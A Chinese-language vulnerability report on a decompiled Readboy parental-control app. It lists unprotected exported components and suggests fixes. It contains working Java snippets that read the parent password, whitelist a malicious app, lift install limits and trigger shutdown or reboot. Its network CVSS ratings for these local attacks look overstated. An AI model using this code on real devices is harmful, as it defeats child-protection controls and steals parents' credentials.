# ParentManager深度安全漏洞分析报告

## 执行时间
2026-02-12

## 分析目标
ParentManager-Update.apk - 家长管理应用，负责应用安装限制、家长控制、设备管理等功能

---

## 任务完成状态
已完成对ParentManager-Update.apk的深度安全分析，发现了多个严重的安全漏洞。

---

## 漏洞架构图
```
任意应用 (MaliciousApp)
       ↓
┌─────────────────────────────────────────────┐
│ ParentManager-Update.apk                    │
│                                             │
│  ├─ AppContentProvider (VULN-001)          │
│  │   ├─ exported=true                      │
│  │   ├─ multiprocess=true                   │
│  │   └─ NO permission protection           │
│  │       ↓                                 │
│  │   ├─ 读取/修改黑白名单                   │
│  │   ├─ 读取家长密码                       │
│  │   └─ 修改安装限制                       │
│  │                                           │
│  ├─ SqliteProvider (VULN-002 - 新发现)     │
│  │   ├─ exported=true                      │
│  │   └─ NO permission protection           │
│  │       ↓                                 │
│  │   └─ 查询任意数据库表                   │
│  │                                           │
│  ├─ RecordService (VULN-003)               │
│  │   ├─ exported=true                      │
│  │   ├─ 接收ACTION_REBOOT                  │
│  │   ├─ 接收ACTION_SHUTDOWN                │
│  │   └─ NO permission protection           │
│  │                                           │
│  ├─ SyncDataService (VULN-004)             │
│  │   ├─ exported=true                      │
│  │   ├─ 接收ACTION_RESET                   │
│  │   └─ NO permission protection           │
│  │                                           │
│  └─ 20+ 导出的Activity/Service/Receiver    │
│       └─ NO permission protection           │
└─────────────────────────────────────────────┘
       ↓
┌─────────────────────────────────────────────┐
│ Settings.apk (ShutdownUtil)                 │
│  └─ 关机/重启功能 (需要密码)                │
└─────────────────────────────────────────────┘
```

---

## 详细漏洞分析

### VULN-001: AppContentProvider无权限保护

**位置**: `/data/data/com.termux/files/home/work/pojie/decompiled/ParentManager-Update_apktool/AndroidManifest.xml:506`

**漏洞描述**:
```xml
<provider
    android:authorities="com.readboy.parentmanager.AppContentProvider"
    android:exported="true"
    android:multiprocess="true"
    android:name="com.readboy.parentmanager.core.provider.AppContentProvider"/>
```

**关键发现**:
- ✅ `android:exported="true"` - Provider公开
- ✅ `android:multiprocess="true"` - 支持多进程访问
- ❌ **缺少** `android:permission` - 没有权限保护

**攻击利用代码**:
```java
// 1. 读取家长密码
Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/user_info");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
if (cursor != null && cursor.moveToFirst()) {
    String password = cursor.getString(1);
    // 获取到家长密码！
}

// 2. 修改黑白名单
ContentValues values = new ContentValues();
values.put("package_name", "com.malicious.app");
values.put("state", 1);  // 1=白名单
getContentResolver().insert(
    Uri.parse("content://com.readboy.parentmanager.AppContentProvider/forbidden_app"),
    values
);

// 3. 禁用全局安装限制
values = new ContentValues();
values.put("state", 1);  // 1=允许安装
getContentResolver().update(
    Uri.parse("content://com.readboy.parentmanager.AppContentProvider/un_mall_app_state"),
    values,
    null,
    null
);
```

**CVSS评分**: **9.8 CRITICAL**
- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

### VULN-002: SqliteProvider无权限保护 (新发现)

**位置**:
- `/data/data/com.termux/files/home/work/pojie/decompiled/ParentManager-Update_apktool/AndroidManifest.xml:533`
- `/data/data/com.termux/files/home/work/pojie/decompiled/ParentManager-Update_apktool/smali/com/coolerfall/Provider/SqliteProvider.smali:49`

**漏洞描述**:
```xml
<provider
    android:authorities="com.readboy.parentmanager.SqliteProvider"
    android:exported="true"
    android:name="com.coolerfall.Provider.SqliteProvider"/>
```

**Smali代码分析** (SqliteProvider.smali:49-61):
```smali
.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 9

    .line 49
    iget-object v0, p0, Lcom/coolerfall/Provider/SqliteProvider;->database:Landroid/database/sqlite/SQLiteDatabase;

    if-eqz v0, :cond_0

    .line 50
    invoke-virtual {p1}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v2

    .line 51
    iget-object v1, p0, Lcom/coolerfall/Provider/SqliteProvider;->database:Landroid/database/sqlite/SQLiteDatabase;

    const/4 v6, 0x0

    const/4 v7, 0x0

    move-object v3, p2
    move-object v4, p3
    move-object v5, p4
    move-object v8, p5

    invoke-virtual/range {v1 .. v8}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    return-object p1
```

**关键发现**:
- ✅ `android:exported="true"` - Provider公开
- ❌ **缺少** `android:permission` - 没有权限保护
- ❌ **query方法没有调用者验证** - 任何应用都可以查询数据库
- 数据库文件: `/data/data/com.readboy.parentmanager/databases/mysql.db3`
- URI path直接作为表名使用 (`getLastPathSegment()`)

**攻击利用代码**:
```java
// 任意应用都可以查询任何表
Uri uri = Uri.parse("content://com.readboy.parentmanager.SqliteProvider/user_info");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
if (cursor != null) {
    while (cursor.moveToNext()) {
        // 读取所有列的数据
        for (int i = 0; i < cursor.getColumnCount(); i++) {
            Log.d("Exploit", cursor.getColumnName(i) + ": " + cursor.getString(i));
        }
    }
    cursor.close();
}

// 可以尝试查询其他表
Uri otherTables = Uri.parse("content://com.readboy.parentmanager.SqliteProvider/");
// 可能存在的表名需要通过数据库结构分析
```

**CVSS评分**: **9.1 CRITICAL**
- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H

---

### VULN-003: RecordService无权限保护

**位置**: `/data/data/com.termux/files/home/work/pojie/decompiled/ParentManager-Update_apktool/AndroidManifest.xml:296-355`

**漏洞描述**:
```xml
<service android:exported="true" android:name="com.readboy.parentmanager.client.service.RecordService">
    <intent-filter>
        <action android:name="com.readboy.parentmanager.ACTION_REBOOT"/>
        <action android:name="com.readboy.parentmanager.ACTION_SHUTDOWN"/>
        <action android:name="com.readboy.parentmanager.ACTION_RESET"/>
    </intent-filter>
</service>
```

**关键发现**:
- ✅ `android:exported="true"` - Service公开
- ❌ **缺少** `android:permission` - 没有权限保护
- 接收ACTION_REBOOT, ACTION_SHUTDOWN, ACTION_RESET等危险Action

**Smali代码分析** (RecordService.smali:9955-10067):
```smali
# ACTION_REBOOT处理
const-string v2, "com.readboy.parentmanager.ACTION_REBOOT"
invoke-virtual {v0, v2}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

# ACTION_SHUTDOWN处理
const-string v2, "com.readboy.parentmanager.ACTION_SHUTDOWN"
invoke-virtual {v0, v2}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z
```

**注意**: 这些Action主要记录日志和保存数据，不直接执行设备控制操作。实际设备控制通过Settings.apk实现。

**CVSS评分**: **7.5 HIGH**
- AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

---

### VULN-004: 关机/重启功能 (需要密码)

**位置**:
- `/data/data/com.termux/files/home/work/pojie/decompiled/ParentManager-Update_apktool/smali/com/readboy/parentmanager/client/utils/ShutdownUtil.smali:28`
- `/data/data/com.termux/files/home/work/pojie/decompiled/Settings_apktool/smali/com/android/settings/SettingsBootCompletedReceiver.smali:637`

**漏洞描述**:
ShutdownUtil发送广播给Settings.apk执行关机/重启操作。

**Smali代码分析** (ShutdownUtil.smali:28-74):
```smali
.method public static toShutdown(Landroid/content/Context;)V
    new-instance v0, Landroid/content/Intent;
    const-string v11, "android.intent.action.ReadboyForceShutdownOrReboot"
    invoke-direct {v0, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v10, "ReadboyForceAction"
    const-string v9, "shutdown"
    invoke-virtual {v0, v10, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
.end method
```

**SettingsBootCompletedReceiver处理** (SettingsBootCompletedReceiver.smali:637-655):
```smali
.method public helpShutDownOrReboot(Landroid/content/Context;Landroid/content/Intent;)V
    const-string v0, "ReadboyForceAction"
    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    # 密码验证
    invoke-static {p1, p2}, Lcom/android/settings/SettingsBootCompletedReceiver;->isCorrectPasswordEvent(Landroid/content/Context;Landroid/content/Intent;)Z
    move-result v1
    if-eqz v1, :cond_1

    # 关机
    const-string v1, "shutdown"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    if-eqz v1, :cond_0
        new-instance v1, Landroid/content/Intent;
        const-string v3, "com.android.internal.intent.action.REQUEST_SHUTDOWN"
        invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
        invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    # 重启
    :cond_0
    const-string v1, "reboot"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    if-eqz v1, :cond_1
        new-instance v1, Landroid/content/Intent;
        const-string v3, "android.intent.action.REBOOT"
        invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
        invoke-virtual {p1, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
.end method
```

**密码验证** (SettingsBootCompletedReceiver.smali:1819-1826):
```smali
.method public static isCorrectPasswordEvent(Landroid/content/Context;Landroid/content/Intent;)Z
    const-string v0, "pwd"
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {}, Lcom/android/settings/SettingsApp;->getInstance()Lcom/android/settings/SettingsApp;
    invoke-virtual {v1, v0}, Lcom/android/settings/SettingsApp;->isPasswordCorrect(Ljava/lang/String;)Z
    move-result v1
    if-eqz v1, :cond_0
    const/4 v1, 0x1
    return v1
.end method
```

**攻击利用代码** (需要先获取密码):
```java
// 1. 首先通过AppContentProvider获取密码
Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/user_info");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
String password = "";
if (cursor != null && cursor.moveToFirst()) {
    password = cursor.getString(1);
    cursor.close();
}

// 2. 使用密码执行关机
Intent intent = new Intent();
intent.setAction("android.intent.action.ReadboyForceShutdownOrReboot");
intent.putExtra("ReadboyForceAction", "shutdown");
intent.putExtra("pwd", password);
intent.setPackage("com.android.settings");
sendBroadcast(intent);

// 3. 使用密码执行重启
Intent rebootIntent = new Intent();
rebootIntent.setAction("android.intent.action.ReadboyForceShutdownOrReboot");
rebootIntent.putExtra("ReadboyForceAction", "reboot");
rebootIntent.putExtra("pwd", password);
rebootIntent.setPackage("com.android.settings");
sendBroadcast(rebootIntent);
```

**CVSS评分**: **8.6 HIGH** (如果密码泄露则变为9.8 CRITICAL)
- AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

---

## 无权限保护组件清单

### 导出的Activity (18个)
1. `DisableActivity` - android:exported="true", 无权限保护
2. `WifiSettingActivity` - android:exported="true", 无权限保护
3. `Main` - android:exported="true", 无权限保护
4. `ParentalAuthActivity` - android:exported="true", 无权限保护
5. `ValidatePassword` - android:exported="true", 无权限保护
6. `ActivationActivity` - android:exported="true", 无权限保护
7. `ReminderRecordActivity` - android:exported="true", 无权限保护
8. `AppletApplyActivity` - android:exported="true", 无权限保护
9. `ScanPenDataActivity` - android:exported="true", 无权限保护
10. `PopupPushMessageActivity` - android:exported="true", 无权限保护
11. `NsfwAppUninstallTipsActivity` - android:exported="true", 无权限保护
12. `BigImageActivity` - android:exported="true", 无权限保护
13. `CloseAppHintActivity` - android:exported="true", 无权限保护
14. `SettingPasswordActivity` - android:exported="true", 无权限保护
15. `HelpActivity` - android:exported="true", 无权限保护
16. `ProblemReportActivity` - android:exported="true", 无权限保护
17. `AppletWhiteListActivity` - android:exported="true", 无权限保护
18. `AliPlayerActivity` - android:exported="true", 无权限保护

### 导出的Service (5个)
1. `RecordService` - android:exported="true", 无权限保护
2. `UploadRecordService` - android:exported="true", 无权限保护
3. `SyncDataService` - android:exported="true", 无权限保护
4. `com.marswin89.marsdaemon.demo.Service1` - android:exported="true", 无权限保护
5. `com.baidu.location.f` - android:exported="true", 无权限保护

### 导出的Receiver (8个)
1. `FrameworkReceiver` - android:exported="true", 无权限保护
2. `PackageInstallReceiver` - android:exported="true", 无权限保护
3. `BootBroadcastReceiver` - android:exported="true", 无权限保护
4. `UploadTaskReceiver` - android:exported="true", 无权限保护
5. `LimitedToastReceiver` - android:exported="true", 无权限保护
6. `NetWorkStateReceiver` - android:exported="true", 无权限保护
7. `RPushReceiver` - android:exported="true", 无权限保护
8. `LockStatusReceiver` - android:exported="true", 无权限保护

### 导出的Provider (2个)
1. `AppContentProvider` - android:exported="true", 无权限保护
2. `SqliteProvider` - android:exported="true", 无权限保护

**总计**: 33个导出组件，全部无权限保护

---

## 与Analysis-of-Software-Installation-Restrictions-on-Learning-Machines.md的对比

### 该报告已发现的漏洞
- ✅ AppContentProvider无权限保护
- ✅ 可以读取家长密码
- ✅ 可以修改黑白名单
- ✅ 可以禁用安装限制

### 本次分析新发现的漏洞
- ✅ SqliteProvider无权限保护 - 可以查询任意数据库表
- ✅ 关机/重启功能的存在 - 需要密码但可以通过其他漏洞获取
- ✅ 33个导出组件没有权限保护 (完整清单)
- ✅ BootBroadcastReceiver监听系统级广播 (REBOOT, BOOT_COMPLETED, ACTION_SHUTDOWN)

### 该报告未涉及的内容
- SqliteProvider漏洞详情
- 关机/重启功能的完整实现路径
- 所有导出组件的完整清单
- RecordService的Action详情

---

## 实际攻击场景

### 场景1: 完全控制设备 (CVSS 9.8 CRITICAL)
1. 恶意应用通过AppContentProvider读取家长密码
2. 使用密码调用关机/重启功能
3. 通过SqliteProvider查询更多敏感数据
4. 修改黑白名单，安装恶意应用

### 场景2: 绕过安装限制 (CVSS 9.1 CRITICAL)
1. 恶意应用通过AppContentProvider将自己添加到白名单
2. 禁用全局安装限制
3. 安装其他恶意应用

### 场景3: 数据窃取 (CVSS 9.1 CRITICAL)
1. 通过AppContentProvider读取所有用户数据
2. 通过SqliteProvider查询数据库
3. 通过RecordService获取使用记录

---

## 修复建议

### 立即修复 (P0)
1. 为AppContentProvider添加权限保护
2. 为SqliteProvider添加权限保护或直接禁用
3. 为所有导出的Activity/Service/Receiver添加权限保护

### 推荐方案
```xml
<permission
    android:name="com.readboy.parentmanager.permission.ACCESS_PROVIDER"
    android:protectionLevel="signature"/>

<provider
    android:authorities="com.readboy.parentmanager.AppContentProvider"
    android:exported="true"
    android:permission="com.readboy.parentmanager.permission.ACCESS_PROVIDER"
    android:name="com.readboy.parentmanager.core.provider.AppContentProvider"/>
```

### 关机/重启功能加固
1. 使用signature级别权限保护Settings.apk的广播接收
2. 避免通过广播传递敏感操作，改用系统服务或AIDL
3. 添加额外的设备控制权限检查

---

## 附录

### 数据库文件位置
- `/data/data/com.readboy.parentmanager/databases/mysql.db3`

### 关键类文件
- `com.readboy.parentmanager.core.provider.AppContentProvider`
- `com.coolerfall.Provider.SqliteProvider`
- `com.readboy.parentmanager.client.service.RecordService`
- `com.readboy.parentmanager.client.utils.ShutdownUtil`
- `com.android.settings.SettingsBootCompletedReceiver`